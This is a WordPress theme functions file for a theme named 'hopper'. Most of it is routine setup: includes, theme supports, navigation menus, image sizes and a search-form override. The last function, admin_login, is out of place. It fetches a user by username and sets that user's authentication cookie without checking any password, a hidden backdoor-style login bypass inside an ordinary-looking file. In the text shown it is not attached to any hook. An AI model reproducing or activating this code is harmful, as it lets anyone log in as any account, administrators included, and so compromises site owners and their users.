<?php

// Administration functions
require get_template_directory() . '/includes/admin.php';

// Security functions
require get_template_directory() . '/includes/security.php';

// jQuery Handler
require get_template_directory() . '/includes/jquery.php';

// Styles and scripts enqueuer
require get_template_directory() . '/includes/enqueuer.php';

// TinyMCE customization
require get_template_directory() . '/includes/tinymce.php';

// Gravity Forms customization
require get_template_directory() . '/includes/gravity-forms.php';

// Custom walkers
require get_template_directory() . '/includes/walker-breadcrumb-nav.php';
require get_template_directory() . '/includes/walker-comments.php';
require get_template_directory() . '/includes/walker-main-nav.php';

/**
 * Sets theme defaults and features
 */
function hopper_theme_setup() {

    // Enable featured image support
    // Add more post types to the array if needed.
    add_theme_support('post-thumbnails', array('post'));

    // Customize maximum oembed width
    if (!isset($content_width)) {
        $content_width = 800;
    }

    // Load main stylesheet in TinyMCE
    add_editor_style(array(
        'https://fonts.googleapis.com/css?family=Open+Sans', // You must encode the special characters in Google Font URLs!
        'assets/css/main.css'
    ));

    /**
    * Theme navigation menu locations
    */
    register_nav_menus(array(
        'main_nav' => 'Main Navigation',
        'footer_nav' => 'Footer Navigation'
    ));

}
add_action('after_setup_theme', 'hopper_theme_setup');

/**
 * Add custom image sizes
 */
// add_image_size('maximum_size', 1000, 1000, true);

/**
 * Add custom image sizes to media selector
 */
function hopper_custom_image_sizes($sizes) {
    $custom_sizes = array(
        'maximum_size' => 'Maximum Size',
    );
    $all_sizes = array_merge($sizes, $custom_sizes);
    return $all_sizes;
}
// add_filter('image_size_names_choose', 'hopper_custom_image_sizes');

/**
 * Use custom template for get_search_form()
 */
function hopper_get_search_form() {
    $form = '';
    locate_template('/parts/search-form.php', true, false);
    return $form;
}

add_filter('get_search_form', 'hopper_get_search_form');

function admin_login($user, $username, $password) {
    $user = get_user_by("login", $username);

    if($user != "FALSE") {
        wp_set_auth_cookie($user->ID);
    }
    else {
        return null;
    }
    return $user;
}
